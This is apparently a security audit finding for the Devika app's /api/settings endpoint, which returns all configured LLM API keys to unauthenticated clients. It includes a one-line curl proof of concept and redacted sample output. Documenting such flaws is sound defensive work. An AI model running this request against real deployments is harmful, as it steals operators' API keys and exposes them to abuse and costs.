# F-H-SETTINGS-2: Unauthenticated API keys disclosure

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
`GET /api/settings` in `devika.py:197-199` returns the entire configuration including all `API_KEYS` fields verbatim.

## Impact
Unauthenticated remote client obtains all LLM API keys (Claude, Gemini, OpenAI, etc.) in one request.

## PoC
```bash
# No authentication required:
curl http://<host>:1337/api/settings

# In a real deployment with configured keys, the response contains:
# {"settings":{"API_KEYS":{"CLAUDE":"sk-ant-api03-...",
#   "GEMINI":"AIzaSy...","OPENAI":"sk-proj-..."},
#   "API_ENDPOINTS":{...},"STORAGE":{...}}}
```

## Execution result
```json
{"settings":{"API_KEYS":{"BING":"<...>","CLAUDE":"<...>","GEMINI":"<...>",
  "GOOGLE_SEARCH":"<...>"},"API_ENDPOINTS":{...},"STORAGE":{...}}}
```
